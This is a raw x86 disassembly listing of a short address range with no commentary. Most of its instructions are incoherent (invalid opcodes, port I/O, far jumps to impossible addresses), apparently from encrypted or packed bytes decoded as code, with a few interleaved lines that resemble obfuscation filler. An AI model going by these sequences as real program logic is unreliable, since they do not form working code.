  404429:	sahf   
  40442a:	in     eax,0x0
  40442c:	aas    
  40442d:	xlat   BYTE PTR ds:[ebx]
  40442e:	js     0x404494
  404430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404431:	jle    0x404475
  404433:	nop
  404434:	dec    ebp
  404435:	aaa    
  404436:	xchg   ebx,eax
  404437:	arpl   WORD PTR [edx],bp
  404439:	jnp    0x40449e
  40443b:	pop    esp
  40443c:	pop    es
  40443d:	call   DWORD PTR [esi-0x5f]
  404440:	mov    dl,0xb6
  404442:	ins    BYTE PTR es:[edi],dx
  404443:	mov    ebx,0xfd147325
  404448:	clc    
  404449:	addr16 sbb eax,0xcf5a87d2
  40444f:	mov    ah,0x1e
  404451:	rcr    DWORD PTR [edx+0x2b1a1e7a],1
  404457:	add    DWORD PTR [ebx+eiz*2-0x7e],esp
  40445b:	pop    edi
  40445c:	or     esp,0xc03464e2
  404462:	mov    cl,0x44
  404464:	xor    bl,dl
  404466:	ss imul ebp,edi,0x1e
  40446a:	cs retf 
  40446c:	mov    WORD PTR [ecx],?
  40446e:	cld    
  40446f:	inc    ecx
  404470:	mov    dl,0x91
  404472:	inc    ebx
  404473:	mov    al,0x9e
  404475:	cmp    BYTE PTR [ebx+0x3516f212],al
  40447b:	mov    ah,bh
  40447d:	int3   
  40447e:	mov    eax,ds:0x68bffd3e
  404483:	inc    ebp
  404484:	rcr    BYTE PTR [esi],cl
  404486:	idiv   BYTE PTR [ebx]
  404488:	ins    DWORD PTR es:[edi],dx
  404489:	xor    bl,al
  40448b:	fstp   TBYTE PTR [ebp+0x472751b0]
  404491:	jmp    0x9e783b33
  404496:	xchg   edi,eax
  404497:	xchg   esp,eax
  404498:	jne    0x4044bf
  40449a:	clc    
  40449b:	pop    ds
  40449c:	and    eax,0xc58243ae
  4044a1:	ss mov dh,0x4e
  4044a4:	dec    edi
  4044a5:	xchg   BYTE PTR [esi+0xa3fce06],dl
  4044ab:	ja     0x40443b
  4044ad:	lods   eax,DWORD PTR ds:[esi]
  4044ae:	repnz push es
  4044b0:	push   edi
  4044b1:	int3   
  4044b2:	sbb    eax,0xefa8b237
  4044b7:	cmp    esp,ecx
  4044b9:	fist   DWORD PTR [edx+edx*2]
  4044bc:	sti    
  4044bd:	and    esi,edi
  4044bf:	dec    esp
  4044c0:	jns    0x40453e
  4044c2:	pop    ebp
  4044c3:	cmp    dh,ah
  4044c5:	imul   esi,DWORD PTR [ebx+0x58],0xb1f2dc6d
  4044cc:	sahf   
  4044cd:	lds    edx,FWORD PTR [ecx+eax*8+0x3b9a081f]
  4044d4:	or     edi,DWORD PTR [ecx+esi*8-0x6]
  4044d8:	stc    
  4044d9:	(bad)  [esi+0x3bd1909c]
  4044df:	sbb    ebx,DWORD PTR [ebx+eiz*4-0x33]
  4044e3:	adc    ebp,DWORD PTR [esi+ecx*2+0x2b1f98f9]
  4044ea:	sbb    al,0x9c
  4044ec:	jp     0x404520
  4044ee:	sahf   
  4044ef:	add    BYTE PTR [ebp+0x5d4a28fd],al
  4044f5:	push   ds
  4044f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044f7:	fldenv [esi+edx*8+0x65]
  4044fb:	fcmovnu st,st(6)
  4044fd:	es push edi
  4044ff:	lock repnz inc esi
  404502:	or     DWORD PTR [ecx+0x1e],eax
  404505:	add    BYTE PTR [esi+0x83dab28],cl
  40450b:	pop    ebp
  40450c:	shr    edi,cl
  40450e:	xchg   edx,eax
  40450f:	int3   
  404510:	hlt    
  404511:	repnz lock mov ah,0x74
  404515:	push   cs
  404516:	xchg   ecx,eax
  404517:	sub    DWORD PTR [esi-0x29eef6ba],0xc97ea3dd
  404521:	sub    DWORD PTR [esi+0x14e3fa7],ebp
  404527:	lods   eax,DWORD PTR ds:[esi]
  404528:	in     eax,0x2
  40452a:	mov    eax,0xf3915c43
  40452f:	stos   BYTE PTR es:[edi],al
  404530:	repz rcr DWORD PTR [edi+eiz*4-0xf],cl
  404535:	aaa    
  404536:	pop    ss
  404537:	jae    0x404551
  404539:	or     DWORD PTR [edx+0x3884ed4e],ebp
  40453f:	pop    ebp
  404540:	sbb    ebp,DWORD PTR [esi+0x34f681e5]
  404546:	mov    esi,esi
  404548:	adc    al,0x20
  40454a:	pusha  
  40454b:	xchg   edx,eax
  40454c:	rcr    dh,1
  40454e:	mov    ecx,DWORD PTR [ebx+0x3d]
  404551:	mov    bh,ah
  404553:	mov    esp,0xe57b30f4
  404558:	lods   eax,DWORD PTR ds:[esi]
  404559:	xchg   ecx,esi
  40455b:	pop    ebx
  40455c:	pop    ss
  40455d:	out    dx,eax
  40455e:	cwde   
  40455f:	test   al,0x4d
  404561:	inc    edi
  404562:	jge    0x4045c8
  404564:	arpl   bp,si
  404566:	adc    BYTE PTR [ebx-0x53],0x3f
  40456a:	lahf   
  40456b:	repz into 
  40456d:	call   0xfd673177
  404572:	sub    eax,0x61589af6
  404577:	shr    BYTE PTR [esi-0x686f782d],cl
  40457d:	cwde   
  40457e:	mov    esi,0x458803a1
  404583:	ror    BYTE PTR [eax+ecx*2-0x44],0x83
  404588:	(bad)
  40458b:	or     cl,al
  40458d:	add    ch,BYTE PTR [ecx+ecx*1-0x45]
  404591:	mov    ch,0x70
  404593:	loopne 0x404517
  404595:	inc    edi
  404596:	add    BYTE PTR ds:0xa62e489c,ch
  40459c:	and    BYTE PTR [eax],dl
  40459e:	inc    esi
  40459f:	fs mov bl,0x3e
  4045a2:	mov    DWORD PTR [ebx+0x16b5d0cd],edi
  4045a8:	sbb    eax,0xd15f8e4
  4045ad:	or     ah,BYTE PTR [ebp+0x16]
  4045b0:	xchg   ebp,eax
  4045b1:	jmp    0xb4b5b045
  4045b6:	mov    DWORD PTR [edi],ecx
  4045b8:	lods   al,BYTE PTR ds:[esi]
  4045b9:	jae    0x4045cd
  4045bb:	(bad)  
  4045bc:	fild   WORD PTR [edx+0x3a]
  4045bf:	dec    ebp
  4045c0:	loop   0x40461e
  4045c2:	into   
  4045c3:	mov    esi,0x246ff591
  4045c8:	fdivp  st(2),st
  4045ca:	out    dx,al
  4045cb:	pop    DWORD PTR [ebx+0x30aa8716]
  4045d1:	hlt    
  4045d2:	(bad)  
  4045d3:	clc    
  4045d4:	stc    
  4045d5:	adc    eax,0x4e4805b2
  4045da:	jns    0x40461b
  4045dc:	jbe    0x4045ea
  4045de:	in     eax,0xfb
  4045e0:	jp     0x40456f
  4045e2:	bound  edi,QWORD PTR [esi+eax*4]
  4045e5:	aam    0x3c
  4045e7:	inc    ebp
  4045e8:	ss xor cl,dh
  4045eb:	imul   esp,DWORD PTR [ecx+0x12],0xf9b41880
  4045f2:	mov    cl,0xbd
  4045f4:	retf   
  4045f5:	pop    ss
  4045f6:	fwait
  4045f7:	outs   dx,DWORD PTR ds:[esi]
  4045f8:	mov    al,ds:0xe46d9467
  4045fd:	cmp    eax,DWORD PTR [eax+0x34045e9d]
  404603:	jae    0x404636
  404605:	in     al,0x3b
  404607:	test   BYTE PTR [edi],dl
  404609:	xor    cl,dh
  40460b:	and    al,0x80
  40460d:	in     al,dx
  40460e:	push   ebp
  40460f:	or     eax,0x4622d556
  404614:	nop
  404615:	mov    edx,0x36cbd60e
  40461a:	ja     0x404629
  40461c:	aaa    
  40461d:	sub    DWORD PTR cs:[edx+0x47c0d467],esi
  404624:	fcom   st(0)
  404626:	mov    ?,eax
  404628:	sub    esp,eax
  40462a:	lods   eax,DWORD PTR ds:[esi]
  40462b:	lock dec BYTE PTR [edi-0x60]
  40462f:	lds    esp,FWORD PTR [edi-0x7a7abf75]
  404635:	jg     0x4045fb
  404637:	add    DWORD PTR [ecx+0x60],0xffffffbb
  40463b:	or     ch,BYTE PTR [ebx]
  40463d:	or     cl,al
  40463f:	rcr    BYTE PTR [eax+eiz*8-0x71],1
  404643:	pop    edi
  404644:	adc    BYTE PTR [esi-0x7777a22a],ah
  40464a:	fistp  WORD PTR [esi-0x41]
  40464d:	xchg   esp,eax
  40464e:	stos   DWORD PTR es:[edi],eax
  40464f:	ror    BYTE PTR [ecx+0x7e],cl
  404652:	sub    BYTE PTR [ebx+0x34],0xee
  404656:	mov    ebx,0x2c4ec8e5
  40465b:	or     BYTE PTR [ebx],0xf0
  40465e:	cmp    esi,eax
  404660:	jmp    0x51b4fc81
  404665:	xor    eax,0xadce23ab
  40466a:	or     eax,0x3c3ff753
  40466f:	popa   
  404670:	push   edx
  404671:	sub    eax,0x57aa6cae
  404676:	xor    ch,BYTE PTR [edi+ebp*1+0x7494abce]
  40467d:	xor    BYTE PTR [eax+0x75],ah
  404680:	(bad)  
  404681:	pop    es
  404682:	das    
  404683:	adc    eax,edi
  404685:	call   FWORD PTR [edx+0x4df846cd]
  40468b:	stc    
  40468c:	rol    DWORD PTR [eax+0xa4efae3],0x20
  404693:	clc    
  404694:	(bad)  
  404695:	rcl    BYTE PTR [ebp-0x32],1
  404698:	sti    
  404699:	cmp    dl,BYTE PTR [edi+0x4c8245f8]
  40469f:	aas    
  4046a0:	pushf  
  4046a1:	cmc    
  4046a2:	xchg   ecx,eax
  4046a3:	repz (bad) 
  4046a5:	popa   
  4046a6:	fcom   DWORD PTR [ebp+0x247953cb]
  4046ac:	(bad)  [eax+ecx*8-0x58cea805]
  4046b3:	add    al,BYTE PTR [ebx-0x1c3761ac]
  4046b9:	mov    ecx,0x81be8bf5
  4046be:	sbb    eax,0x68d11aca
  4046c3:	pop    ecx
  4046c4:	and    BYTE PTR [edx],ch
  4046c6:	dec    esi
  4046c7:	xchg   ebp,eax
  4046c8:	inc    esp
  4046c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046ca:	pop    ds
  4046cb:	or     ecx,DWORD PTR [ecx]
  4046cd:	ret    
  4046ce:	xor    DWORD PTR [ecx],0xffffffb3
  4046d1:	mov    esp,edx
  4046d3:	add    BYTE PTR [edi],0xf
  4046d6:	call   0x76b7101
  4046db:	loop   0x40467b
  4046dd:	mov    edi,0xfa254796
  4046e2:	test   eax,0xba87759e
  4046e7:	xchg   dh,cl
  4046e9:	stos   DWORD PTR es:[edi],eax
  4046ea:	cmp    esi,DWORD PTR [edi+ecx*1-0x5729a689]
  4046f1:	jmp    0x6eb9:0x6446912f
  4046f8:	rol    BYTE PTR [ecx-0x9],1
  4046fb:	and    al,0xc3
  4046fd:	(bad)  
  4046fe:	add    DWORD PTR ss:[ebp-0x463fc9fe],edx
  404705:	repnz sbb al,BYTE PTR [eax+0x3f]
  404709:	mov    ch,0xc
  40470b:	push   cs
  40470c:	jo     0x4046bc
  40470e:	and    al,0x60
  404710:	pop    esi
  404711:	mov    ds:0x4e7181fc,eax
  404716:	add    DWORD PTR [ebp+0x62440e8d],ebp
  40471c:	cmp    eax,0x25ba655
  404721:	mov    ebx,0xb9a3802b
  404726:	mov    edx,0x34ee785e
  40472b:	push   esi
  40472c:	out    dx,eax
  40472d:	add    eax,0xcfb2cae6
  404732:	pusha  
  404733:	inc    edx
  404734:	mov    fs,di
  404737:	pop    eax
  404738:	mov    al,0x9
  40473a:	icebp  
  40473b:	mov    DWORD PTR [edi],ecx
  40473d:	lods   al,BYTE PTR ds:[esi]
  40473e:	rol    DWORD PTR [edx],1
  404740:	or     DWORD PTR ds:0x428293,0x42824f
  40474a:	shr    edx,0x2
  40474d:	mov    edx,DWORD PTR ds:0x42826f
  404753:	or     DWORD PTR ds:0x42836f,edx
  404759:	mov    DWORD PTR [ebp-0x1c],ecx
  40475c:	jmp    0x404b3a
  404761:	add    al,0x2a
  404763:	lea    edi,[eax+0x1a]
  404766:	fcomp  QWORD PTR ss:[edx]
  404769:	pop    edi
  40476a:	or     al,0x3f
  40476c:	mov    esi,0xaa29fe8e
  404771:	fcmovnb st,st(7)
  404773:	sbb    BYTE PTR [eax],bl
  404775:	sahf   
  404776:	adc    bl,BYTE PTR [eax]
  404778:	sbb    BYTE PTR [eax+0x4f274cc6],ch
  40477e:	scas   al,BYTE PTR es:[edi]
  40477f:	xchg   edi,eax
  404780:	imul   edi,ebx,0xffffffd9
  404783:	addr16 (bad) 
  404785:	mov    eax,ds:0x30fc5c2
  40478a:	cli    
  40478b:	or     dh,ah
  40478d:	mov    dl,bl
  40478f:	push   0xffffff8b
  404791:	pop    edi
  404792:	and    esp,0xffffffac
  404795:	shr    DWORD PTR [ebx+0x31],0x3
  404799:	xchg   ebx,eax
  40479a:	pop    DWORD PTR [ebp-0x2356ea29]
  4047a0:	pushf  
  4047a1:	fcom   DWORD PTR [esi-0x63]
  4047a4:	jnp    0x404771
  4047a6:	xchg   ecx,eax
  4047a7:	sub    BYTE PTR [eax-0x44],0xd0
  4047ab:	addr16 xchg edx,eax
  4047ad:	(bad)  
  4047b0:	jge    0x4047e2
  4047b2:	int    0x7c
  4047b4:	fisubr DWORD PTR [ebx]
  4047b6:	sub    eax,0xbf97dcde
  4047bb:	dec    edx
  4047bc:	inc    esp
  4047bd:	sub    BYTE PTR [eax+0x12408aa6],0xb5
  4047c4:	fsub   QWORD PTR [esi+esi*4]
  4047c7:	cdq    
  4047c8:	adc    ecx,eax
  4047ca:	int3   
  4047cb:	sub    BYTE PTR [ecx+0x72cab889],dl
  4047d1:	mov    ds:0x8620810,al
  4047d6:	test   BYTE PTR [ebp+0x11],cl
  4047d9:	das    
  4047da:	mov    ebx,0x7d10316e
  4047df:	push   ss
  4047e0:	std    
  4047e1:	les    ecx,FWORD PTR [eax]
  4047e3:	add    dh,0x48
  4047e6:	mov    DWORD PTR [ecx-0x72],ebx
  4047e9:	repnz ds fdivr st,st(5)
  4047ed:	mov    eax,0x1a2f5686
  4047f2:	lahf   
  4047f3:	or     DWORD PTR [ecx-0x44],0xdbef33ca
  4047fa:	lock pop edi
  4047fc:	sbb    bl,BYTE PTR [edx+0x35]
  4047ff:	ja     0x4047fa
  404801:	jne    0x404789
  404803:	sbb    DWORD PTR [ecx+edi*8],esp
  404806:	add    edx,DWORD PTR [edi+edi*2-0x34]
  40480a:	sti    
  40480b:	jnp    0x40487e
  40480d:	nop
  40480e:	fstp   QWORD PTR [esi+0x5]
  404811:	xchg   edi,eax
  404812:	push   edi
  404813:	dec    esi
  404814:	call   0x71c9e9ad
  404819:	mov    ds:0x779c5f1e,eax
  40481e:	cmp    al,0x4a
  404820:	push   eax
  404821:	mov    eax,ds:0x1748482d
  404826:	cld    
  404827:	popa   
  404828:	pop    ss
  404829:	jbe    0x404844
  40482b:	stc    
  40482c:	lods   al,BYTE PTR ds:[esi]
  40482d:	fcom   st(1)
  40482f:	ret    0xe8f9
  404832:	test   BYTE PTR [eax+ebx*4+0x3],0xc2
  404837:	jmp    0xbabb:0xf35b481d
  40483e:	or     eax,0xeaccc268
  404843:	mov    bl,0x7d
  404845:	jmp    0x40487b
  404847:	xor    cl,al
  404849:	dec    ebx
  40484a:	invd   
  40484c:	fs (bad) 
  40484e:	sbb    BYTE PTR [edi+0x3],bl
  404851:	(bad)  
  404852:	out    0xbd,eax
  404854:	dec    edx
  404855:	aas    
  404856:	sub    BYTE PTR [edi-0x62d6b0e],cl
  40485c:	jle    0x4047e4
  40485e:	mov    bl,0x91
  404860:	in     eax,0x46
  404862:	(bad)  
  404863:	inc    ebx
  404864:	xchg   cl,cl
  404866:	int3   
  404867:	ror    DWORD PTR [edx+0x72],cl
  40486a:	(bad)  
  40486b:	and    dh,BYTE PTR [esi-0x4a]
  40486e:	dec    esi
  40486f:	shr    ch,0x10
  404872:	loop   0x4048e0
  404874:	or     esi,ebx
  404876:	ins    DWORD PTR es:[edi],dx
  404877:	mov    bl,0xba
  404879:	addr16 pop edx
  40487b:	xchg   ebp,eax
  40487c:	mov    al,ds:0x94540d6a
  404881:	cdq    
  404882:	test   DWORD PTR [ebp+0x4dcfacfd],eax
  404888:	push   ecx
  404889:	mov    al,0xc9
  40488b:	mov    ch,0xff
  40488d:	arpl   di,bp
  40488f:	adc    al,BYTE PTR [ebx]
  404891:	sbb    eax,0x375ad268
  404896:	data16 mov bh,0x15
  404899:	jb     0x404856
  40489b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40489c:	dec    ebp
  40489d:	cmp    eax,0xe2e76624
  4048a2:	imul   esp,DWORD PTR [edi+0x568d8310],0x79afcef2
  4048ac:	dec    BYTE PTR [esi+eax*2+0x1d]
  4048b0:	mov    eax,ds:0x937871ad
  4048b5:	ret    0xa22d
  4048b8:	inc    edi
  4048b9:	xor    al,0x46
  4048bb:	enter  0x7eba,0xfd
  4048bf:	add    esp,DWORD PTR [eax-0x60]
  4048c2:	adc    BYTE PTR [ebx+0x48],ch
  4048c5:	mov    ah,0xe8
  4048c7:	dec    edi
  4048c8:	dec    edi
  4048c9:	mov    eax,ds:0x44dcf855
  4048ce:	(bad)  
  4048cf:	cmp    al,0xde
  4048d1:	mov    edi,0x509609bc
  4048d6:	xor    ah,BYTE PTR [ecx]
  4048d8:	or     al,0x95
  4048da:	jg     0x4048f6
  4048dc:	enter  0x29d,0x7a
  4048e0:	xchg   esi,ebx
  4048e2:	std    
  4048e3:	repz or eax,0xa1d83dae
  4048e9:	js     0x404962
  4048eb:	add    ebx,edx
  4048ed:	inc    esi
  4048ee:	shl    BYTE PTR ds:0xfa38e515,0x66
  4048f5:	mov    bh,0x12
  4048f7:	stos   DWORD PTR es:[edi],eax
  4048f8:	leave  
  4048f9:	or     BYTE PTR cs:[si-0x70],al
  4048fe:	fimul  DWORD PTR [eax]
  404900:	pop    esp
  404901:	add    eax,0xd136ff3e
  404906:	mov    BYTE PTR [ecx-0x73],bl
  404909:	mov    esi,0xbf3ec057
  40490e:	cmp    esi,DWORD PTR [edi+0x2bc4ba08]
  404914:	xor    eax,0x716dde47
  404919:	cwde   
  40491a:	cmp    al,0x53
  40491c:	pop    ebx
  40491d:	xchg   esp,eax
  40491e:	ret    0x585f
  404921:	scas   eax,DWORD PTR es:[edi]
  404922:	push   cs
  404923:	push   ecx
  404924:	mov    ebp,0xca5e130d
  404929:	inc    ebx
  40492a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40492b:	sti    
  40492c:	fs aaa 
  40492e:	push   edx
  40492f:	mov    BYTE PTR [eax],cl
  404931:	ds cmp al,0x14
  404934:	xchg   BYTE PTR [ecx+0x5bd939b4],cl
  40493a:	out    dx,al
  40493b:	(bad)  
  40493c:	cli    
  40493d:	imul   edi,DWORD PTR [ecx+0x6e],0x61f26c1d
  404944:	test   BYTE PTR [esp+ecx*8+0x2f15334b],dl
  40494b:	repnz aas 
  40494d:	adc    BYTE PTR [edx*1+0x57280054],dh
  404954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404955:	lea    esp,[ecx-0x67]
  404958:	into   
  404959:	neg    dh
  40495b:	and    eax,0x4aec0170
  404960:	out    0xe,al
  404962:	loop   0x4048f3
  404964:	sub    eax,0xaffff7a3
  404969:	cli    
  40496a:	arpl   WORD PTR [ebx+0x33],ax
  40496d:	mov    edx,0xa427befb
  404972:	retf   
  404973:	fs mov ch,0xf6
  404976:	and    ebx,DWORD PTR [ebp+0x16dcdb20]
  40497c:	test   eax,0x9e989335
  404981:	mov    WORD PTR [edx+edi*4],ds
  404984:	xchg   esi,eax
  404985:	inc    edx
  404986:	xchg   ebp,eax
  404987:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404988:	cmp    DWORD PTR [ecx-0x55bb819b],ebx
  40498e:	outs   dx,DWORD PTR ds:[esi]
  40498f:	in     al,dx
  404990:	mov    al,ds:0xeaaa781e
  404995:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404996:	or     al,0xce
  404998:	rol    edx,cl
  40499a:	cld    
  40499b:	dec    esp
  40499c:	dec    ebp
  40499d:	jmp    0x79a4:0xbbd771d7
  4049a4:	mov    al,BYTE PTR [edx]
  4049a6:	mov    ah,0x76
  4049a8:	and    DWORD PTR [ecx-0x17],0xffffff8e
  4049ac:	sub    DWORD PTR [edi],edi
  4049ae:	inc    esi
  4049af:	test   DWORD PTR [edx-0x2d],0x2dfa3e88
  4049b6:	pop    es
  4049b7:	add    BYTE PTR [ecx+0x5b],al
  4049ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049bb:	sub    al,0xc8
  4049bd:	mov    ds:0xd07d7586,al
  4049c2:	and    edi,DWORD PTR [eax]
  4049c4:	inc    esi
  4049c5:	push   ebx
  4049c6:	mov    edx,0x8fae673b
  4049cb:	and    ch,BYTE PTR [edx]
  4049cd:	test   ecx,eax
  4049cf:	xchg   ebp,eax
  4049d0:	xchg   ecx,eax
  4049d1:	aaa    
  4049d2:	mov    ch,0x12
  4049d4:	in     eax,0x41
  4049d6:	adc    bl,BYTE PTR [eax+0x7e9d7d6f]
  4049dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049dd:	push   0xffffff8f
  4049df:	sar    BYTE PTR [bp+si],0x35
  4049e3:	nop
  4049e4:	jb     0x4049a4
  4049e6:	mov    dl,0x92
  4049e8:	or     esi,esi
  4049ea:	cwde   
  4049eb:	push   ebx
  4049ec:	outs   dx,BYTE PTR ds:[esi]
  4049ed:	(bad)  
  4049ee:	ror    BYTE PTR [eax-0x965dfd0],0x3a
  4049f5:	sahf   
  4049f6:	mov    edi,DWORD PTR [edi+0x35406e6a]
  4049fc:	lods   eax,DWORD PTR ds:[esi]
  4049fd:	and    al,0x46
  4049ff:	xor    eax,0xc936b322
  404a04:	mov    al,0x76
  404a06:	cli    
  404a07:	jecxz  0x404a7e
  404a09:	sbb    al,BYTE PTR [ecx]
  404a0b:	repz xchg esp,eax
  404a0d:	jnp    0x404a53
  404a0f:	popf   
  404a10:	in     al,0x89
  404a12:	(bad)  
  404a13:	icebp  
  404a14:	popf   
  404a15:	(bad)  [ebx-0x1c]
  404a18:	cmp    dl,BYTE PTR [edx]
  404a1a:	(bad)  
  404a1b:	push   ebx
  404a1c:	jmp    0x58c29357
  404a21:	push   ebx
  404a22:	inc    ebx
  404a23:	les    ecx,FWORD PTR [edx+0x10a90088]
  404a29:	hlt    
  404a2a:	fwait
  404a2b:	das    
  404a2c:	cli    
  404a2d:	(bad)  
  404a2f:	push   0xcf751cd5
  404a34:	mov    ds:0x3c384cf8,al
  404a39:	enter  0xf3e0,0x7c
  404a3d:	or     ah,BYTE PTR [ebx]
  404a3f:	push   es
  404a40:	mov    bl,BYTE PTR [ebx]
  404a42:	in     eax,0xe6
  404a44:	js     0x404a90
  404a46:	stos   DWORD PTR es:[edi],eax
  404a47:	in     al,0x50
  404a49:	popa   
  404a4a:	jmp    0xd19c:0xb3344b49
  404a51:	xchg   edx,eax
  404a52:	mov    gs,WORD PTR [ebp+0x17]
  404a55:	push   ecx
  404a56:	or     DWORD PTR [edx],edx
  404a58:	cmp    BYTE PTR [esi],ah
  404a5a:	arpl   ax,dx
  404a5c:	cld    
  404a5d:	pop    esp
  404a5e:	adc    al,0x76
  404a60:	in     eax,0x8
  404a62:	xchg   esi,eax
  404a63:	test   BYTE PTR [esi],bl
  404a65:	test   BYTE PTR [edi+0x53313d8c],cl
  404a6b:	ins    BYTE PTR es:[edi],dx
  404a6c:	or     dh,BYTE PTR [eax-0x3a43766c]
  404a72:	call   0xba72e082
  404a77:	dec    esp
  404a78:	xor    ecx,DWORD PTR [edi]
  404a7a:	jnp    0x404ac5
  404a7c:	cmp    al,0x55
  404a7e:	sahf   
  404a7f:	out    dx,eax
  404a80:	jo     0x404a42
  404a82:	aaa    
  404a83:	xchg   edx,esi
  404a85:	fsub   QWORD PTR ds:0x1f794d0f
  404a8b:	mov    esp,0x26b4beb0
  404a90:	add    esi,ebx
  404a92:	push   0xffffffb3
  404a94:	dec    ebx
  404a95:	fist   WORD PTR [edi+0x4f]
  404a98:	and    al,0x42
  404a9a:	xchg   ecx,eax
  404a9b:	jo     0x404afc
  404a9d:	sbb    al,0x84
  404a9f:	adc    cl,BYTE PTR [edx+0x4135a87a]
  404aa5:	lahf   
  404aa6:	mov    eax,0x5a18bd05
  404aab:	dec    ecx
  404aac:	cmp    dl,al
  404aae:	cmp    BYTE PTR [ecx],0x59
  404ab1:	push   ds
  404ab2:	imul   eax,DWORD PTR [ebx],0xb081bfbf
  404ab8:	jl     0x404a5e
  404aba:	inc    esp
  404abb:	dec    ebx
  404abc:	dec    ecx
  404abd:	cmp    esp,DWORD PTR [esi-0x6a]
  404ac0:	jnp    0x404a4d
  404ac2:	dec    eax
  404ac3:	stos   BYTE PTR es:[edi],al
  404ac4:	add    eax,0x37c6e5db
  404ac9:	mov    edx,0x3e0ac364
  404ace:	pop    ebp
  404acf:	inc    esp
  404ad0:	mov    edx,0xb2775495
  404ad5:	scas   al,BYTE PTR es:[edi]
  404ad6:	mov    esp,0x7f670ce5
  404adb:	pop    ebp
  404adc:	ja     0x404b0c
  404ade:	inc    edx
  404adf:	dec    edx
  404ae0:	or     cl,ah
  404ae2:	data16 (bad) 
  404ae4:	std    
  404ae5:	rol    BYTE PTR [edx],cl
  404ae7:	imul   ebx,edx,0xc049459c
  404aed:	out    0xca,al
  404aef:	or     al,0xc0
  404af1:	or     eax,0x8f9173f1
  404af6:	jae    0x404a85
  404af8:	call   0x665d:0x6c5aa513
  404aff:	inc    edi
  404b00:	fbld   TBYTE PTR [ebx+eax*1+0x2c]
  404b04:	jne    0x404aa6
  404b06:	ins    BYTE PTR es:[edi],dx
  404b07:	sbb    eax,0x7ce503b5
  404b0c:	pusha  
  404b0d:	aas    
  404b0e:	jl     0x404b44
  404b10:	adc    DWORD PTR [edx+ecx*1],0xffffffc8
  404b14:	sbb    eax,0x44812acb
  404b19:	fnstsw WORD PTR [edi-0x3222de0a]
  404b1f:	sti    
  404b20:	push   es
  404b21:	sar    DWORD PTR ds:0x6c53c388,0x49
  404b28:	test   al,0x23
  404b2a:	xchg   ecx,eax
  404b2b:	in     eax,dx
  404b2c:	sub    BYTE PTR [esp+edx*1+0x775dcb96],bh
  404b33:	movups xmm5,xmm1
  404b36:	cdq    
  404b37:	stos   DWORD PTR es:[edi],eax
  404b38:	dec    ecx
  404b39:	ror    DWORD PTR [ebx+0x4538b0b],1
  404b3f:	xor    DWORD PTR [ebp-0x1c],edi
  404b42:	add    DWORD PTR ds:0x428283,0x4282f7
  404b4c:	xor    edx,edx
  404b4e:	jmp    0x404f2c
  404b53:	scas   al,BYTE PTR es:[edi]
  404b54:	ds out dx,al
  404b56:	and    ebx,DWORD PTR [edi+0x22]
  404b59:	sbb    bh,BYTE PTR [edx]
  404b5b:	fsubp  st(5),st
  404b5d:	push   ebx
  404b5e:	stos   BYTE PTR es:[edi],al
  404b5f:	call   0x60bd0480
  404b64:	rcr    DWORD PTR [eax],0x18
  404b67:	sahf   
  404b68:	adc    bl,BYTE PTR [eax]
  404b6a:	sbb    BYTE PTR [esi+0x51],bh
  404b6d:	mov    fs,eax
  404b6f:	outs   dx,BYTE PTR ds:[esi]
  404b70:	stos   BYTE PTR es:[edi],al
  404b71:	scas   eax,DWORD PTR es:[edi]
  404b72:	fmul   QWORD PTR [ecx+0x192c9dc7]
  404b78:	in     al,0x3e
  404b7a:	jg     0x404b95
  404b7c:	sahf   
  404b7d:	rcl    DWORD PTR [ebx-0x1d],1
  404b80:	mov    al,ds:0xae9e8f51
  404b85:	or     BYTE PTR [ebx-0x35e519ed],dh
  404b8b:	pop    eax
  404b8c:	push   esp
  404b8d:	clc    
  404b8e:	push   esi
  404b8f:	sub    eax,0xef3fd081
  404b94:	push   ss
  404b95:	gs xchg esi,eax
  404b97:	adc    DWORD PTR [ecx+0x4c45998b],0xffffffca
  404b9e:	out    0xfb,al
  404ba0:	dec    ecx
  404ba1:	push   esi
  404ba2:	mov    al,ds:0x284563de
  404ba7:	xchg   DWORD PTR [ebp+0x3af08a8],esp
  404bad:	pop    esp
  404bae:	(bad)
  404bb2:	or     eax,0xb338495d
  404bb8:	in     eax,0xd3
  404bba:	ins    BYTE PTR es:[edi],dx
  404bbb:	cmp    ebp,DWORD PTR ds:0x7a29dfa2
  404bc1:	sahf   
  404bc2:	inc    esp
  404bc3:	out    0xbb,al
  404bc5:	mov    bl,0x32
  404bc7:	das    
  404bc8:	inc    edx
  404bc9:	mov    edi,0xd1c39b12
  404bce:	push   cs
  404bcf:	jl     0x404c49
  404bd1:	lock lods eax,DWORD PTR ds:[esi]
  404bd3:	test   eax,0xbea30600
  404bd8:	fldenv [ecx]
  404bda:	jmp    0xe3a359e9
  404bdf:	fsubr  DWORD PTR ss:0x75c508cf
  404be6:	add    al,0xb9
  404be8:	lds    ebp,FWORD PTR ds:[ecx+ebp*2+0x4e55c7c9]
  404bf0:	jae    0x404b9a
  404bf2:	push   ecx
  404bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bf4:	cmp    al,BYTE PTR [edi-0x31eceb1d]
  404bfa:	shl    BYTE PTR [ebp-0x17],cl
  404bfd:	dec    eax
  404bfe:	cdq    
  404bff:	mov    eax,DWORD PTR [eax-0x60c635c1]
  404c05:	jmp    0xf0a83f1c
  404c0a:	inc    ebx
  404c0b:	xor    ebx,esp
  404c0d:	hlt    
  404c0e:	push   ebp
  404c0f:	lds    ebx,FWORD PTR [esi*4+0x7dd45180]
  404c16:	int    0xe5
  404c18:	dec    esi
  404c19:	inc    esi
  404c1a:	call   0xb91f2f9d
  404c1f:	mov    gs,WORD PTR [edi-0x5f24ec09]
  404c25:	leave  
  404c26:	sar    DWORD PTR [ecx],0xbb
  404c29:	lahf   
  404c2a:	enter  0x1323,0x75
  404c2e:	xchg   edx,eax
  404c2f:	pushf  
  404c30:	movlps xmm0,QWORD PTR [esi-0x54083906]
  404c37:	and    eax,0x37edcb1
  404c3c:	or     BYTE PTR [ecx+0x5b],0x29
